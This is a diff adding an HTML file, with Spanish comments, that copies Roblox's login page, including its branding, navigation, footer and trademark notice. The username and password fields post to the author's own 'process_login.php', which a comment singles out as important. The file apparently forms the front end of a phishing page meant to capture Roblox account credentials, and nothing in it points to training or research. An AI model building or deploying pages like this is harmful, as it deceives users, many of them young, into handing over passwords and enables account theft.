@@ -1,0 +1,89 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <!-- Enlace a nuestro archivo de estilos -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- 🌟 HEADER SUPERIOR (La barra negra con el logo y botones) 🌟 -->
+    <header class="roblox-header">
+        <div class="logo">ROBLOX</div>
+        <nav class="main-nav">
+            <a href="#">Charts</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Create</a>
+            <a href="#">Robux</a>
+        </nav>
+        <div class="header-actions">
+            <button class="search-btn"><span class="icon">&#128269;</span> Search</button> <!-- Usamos un ícono de lupa -->
+            <button class="sign-up-btn">Sign Up</button>
+            <button class="login-btn">Log In</button>
+        </div>
+    </header>
+
+    <!-- 🌟 CONTENIDO CENTRAL (El área principal con el formulario) 🌟 -->
+    <main class="login-container">
+        <div class="login-box">
+            <h1 class="title">Login to Roblox</h1>
+            
+            <!-- El FORMULARIO: IMPORTANTE, 'action' apunta a nuestro script PHP -->
+            <form id="loginForm" action="process_login.php" method="POST">
+                
+                <!-- Campo Usuario/Email/Teléfono -->
+                <div class="input-group">
+                    <label for="username">Username/Email/Phone</label>
+                    <input type="text" id="username" name="username" placeholder="Username/Email/Phone" required>
+                </div>
+
+                <!-- Campo Contraseña -->
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+
+                <!-- Botón Principal de Login -->
+                <button type="submit" class="btn-primary">Log In</button>
+            </form>
+
+            <!-- Enlaces debajo del botón principal -->
+            <div class="links-section">
+                <a href="#" class="forgot-link">Forgot Password or Username?</a>
+                <hr> <!-- Línea divisoria -->
+                <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
+                <button type="button" class="btn-tertiary">Log In With Another Device</button>
+            </div>
+
+            <!-- Enlace de registro al final -->
+            <div class="signup-prompt">
+                Don't have an account? <a href="#">Sign Up</a>
+            </div>
+        </div>
+    </main>
+
+    <!-- 🌟 FOOTER (La barra inferior con los enlaces legales) 🌟 -->
+    <footer class="roblox-footer">
+        <div class="footer-links">
+            <a href="#">About Us</a>
+            <a href="#">Jobs</a>
+            <a href="#">Blog</a>
+            <a href="#">Parents</a>
+            <a href="#">Buy Gift Cards</a>
+            <a href="#">Help</a>
+            <a href="#">Terms</a>
+            <a href="#">Accessibility</a>
+            <a href="#">Privacy</a>
+        </div>
+        <div class="footer-copyright">
+            &copy;2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+        </div>
+    </footer>
+
+    <!-- Enlace a nuestro archivo de JavaScript -->
+    <script src="script.js"></script>
+</body>
+</html>
